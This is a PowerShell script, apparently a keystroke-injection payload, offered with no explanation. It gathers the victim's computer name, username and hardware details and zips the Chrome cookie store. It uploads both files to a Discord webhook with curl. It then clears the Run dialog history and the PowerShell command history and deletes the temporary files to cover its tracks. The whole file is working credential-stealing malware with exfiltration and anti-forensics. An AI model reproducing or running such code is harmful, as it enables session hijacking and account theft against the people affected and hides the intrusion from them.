############################################################################################################################################################

$ComputerName = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty Name
$UserName = Get-ChildItem Env:UserName | Select-Object -ExpandProperty Value
# CPU
$ProcessorName = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
$CoresCount = (Get-WmiObject -Class Win32_Processor | Measure-Object -Property NumberOfLogicalProcessors -Sum).Sum
# RAM
$ram = Get-CimInstance Win32_PhysicalMemory
$RamManufacturer = $ram[0].Manufacturer.Trim()
$RamModel = $ram[0].PartNumber.Trim()
$RamSpeed = $ram[0].Speed
$RamCount = [math]::Round((Get-CimInstance win32_physicalmemory | Measure-Object -Property capacity -Sum | Select-Object -ExpandProperty Sum) / 1GB, 2)
# GPU
$gpu = Get-CimInstance Win32_VideoController
$GpuName = $gpu.Name
$GpuRam = [math]::Round(($gpu.AdapterRAM / 1GB), 2)
# MotherBoard
$motherboard = Get-CimInstance Win32_BaseBoard
$MotherboardName = $motherboard.Manufacturer
$MotherboardModel = $motherboard.Product

$cookiesPath = "C:\Users\Towa\AppData\Local\Google\Chrome\User Data\Default\Network\*"
if ($cookiesPath) {Compress-Archive -Path $cookiesPath -DestinationPath "C:\Windows\Temp\cookies.zip" -Force}

$info = "==============================`nComputer Name: $ComputerName`nUser Name: $UserName`nCPU:`n   Name: $ProcessorName`n   Cores: $CoresCount`nRAM:`n   Name: $RamManufacturer`n   Model: $RamModel`n   Speed: $RamSpeed MHz`n   GB: $RamCount`nGPU:`n   Name: $gpuName`n   RAM: $GpuRam GB`nMotherBoard:`n   Name: $MotherboardName`n   Model: $MotherboardModel`n=============================="

$info > "C:\Windows\Temp\info.txt"

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file
)

$hookurl = "https://discord.com/api/webhooks/$dc"

$files = @("C:\Windows\Temp\info.txt", "C:\Windows\Temp\cookies.zip")

$fileList = ''
$i = 1

$files | ForEach-Object { if (Test-Path $_) { $fileList += "-F `"file$i=@$_`" "; $i += 1 } }

if ($fileList) {
    $curlCommand = "curl.exe $fileList $hookurl"
    Invoke-Expression $curlCommand
}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "C:\Windows\Temp\info.txt"}

function Clean-Exfil {reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f;Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue}; Clean-Exfil

RI "C:\Windows\Temp\info.txt"; RI "C:\Windows\Temp\cookies.zip"
